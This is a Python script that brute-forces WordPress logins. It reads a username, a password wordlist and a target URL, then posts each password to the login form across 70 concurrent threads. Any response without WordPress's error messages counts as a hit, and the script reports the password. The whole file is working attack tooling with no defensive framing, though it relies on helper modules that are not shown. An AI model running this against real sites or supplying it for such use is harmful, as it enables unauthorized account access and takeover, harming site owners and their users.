#!/usr/bin/python3 


import requests,sys, os
from termcolor import colored
from checkers import Checker
from banner_and_help import banner, helper
from concurrent.futures import ThreadPoolExecutor
from pwn import * 


def make_request(password):
    data = { 
        'log': user,
        'pwd': password,
        'wp-submit': 'Log In'
    }

    try: 
        req = requests.post(url, data=data, timeout=5)

        credentials.status(password)
        
        if ('The password field is empty' not in req.text) and ('The password you entered for the username' not in req.text): 
            credentials.success(password)
            print(colored("\n[*] ", 'blue') +  " Finished!")
            os._exit(0)
    except:
        pass



# Main program
if __name__ == '__main__': 

    banner()

    if len(sys.argv) == 4:

        # Get variables
        user = sys.argv[1]
        file = sys.argv[2]
        url = sys.argv[3]

        # Checkr object to check params 
        checker = Checker(user, file, url)

        if checker.check_url():
            if checker.check_user():
                if checker.check_file():
                    
                    with open(file, 'r') as wordlist:                     
    
                        print(colored('[*]', 'blue') + ' Starting Attack...\n')                    
                        credentials = log.progress(user)
                                            
                        with ThreadPoolExecutor(max_workers=70) as executor:
                            executor.map(make_request, [password.rstrip() for password in wordlist])

                        credentials.success(colored('password not found', 'red'))
                    
                else:
                    print(colored("[!] Error: something went wrong when opening the dictionary...", 'blue'))
                    sys.exit(2)
            else:
                print(colored("[!] Error: user is not valid...", 'blue'))
                sys.exit(2)
        else: 
            print(colored("[!] Error: something went wrong with the target, check if it's up...", 'blue'))                
            sys.exit(2)            
    else: 
        helper(sys.argv[0])
        sys.exit(0)
